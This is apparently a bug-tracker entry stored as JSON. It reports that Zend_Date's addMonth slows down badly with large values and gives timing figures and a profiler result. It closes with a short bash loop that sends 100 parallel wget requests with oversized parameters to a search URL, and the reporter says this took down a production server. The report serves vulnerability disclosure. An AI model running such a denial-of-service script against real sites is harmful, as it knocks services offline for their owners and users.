        "description": {
            "name": "description",
            "type": "java.lang.String",
            "value": "Lets look at the following code:\r\n{color:gray}\r\n<?php\r\ninclude('Zend\/Date.php');\r\n\r\n$value = 10000000;\r\n\r\n$date = new Zend_Date(time());\r\n$date->addMonth($value);\r\n{color}\r\n\r\nHere are values and time of execution pairs (tested on Intel(R) Core(TM) i7 CPU 920 @ 2.67GHz)\r\n\r\n\r\n| value       | time of execution |\r\n| 10000000    |            3.049s |\r\n| 100000000   |           36.241s |\r\n| 1000000000  |        5m 34.667s |\r\n\r\n\r\nProfiler said that function which takes 99% time of execution is getDateParts of Zend_Date_DateObject.\r\n\r\nNote: When developer dont check range of input parameters DoS attack is possible (I was able to take down production live server by following simple bash script):\r\n{color:gray}\r\n#!\/bin\/bash\r\n\r\nfor i in {1..100}\r\ndo\r\n        url=\"http:\/\/www.example.com\/search\/age_to\/99999999999999999$i\";\r\n        wget $url &\r\ndone\r\n{color}"
        },
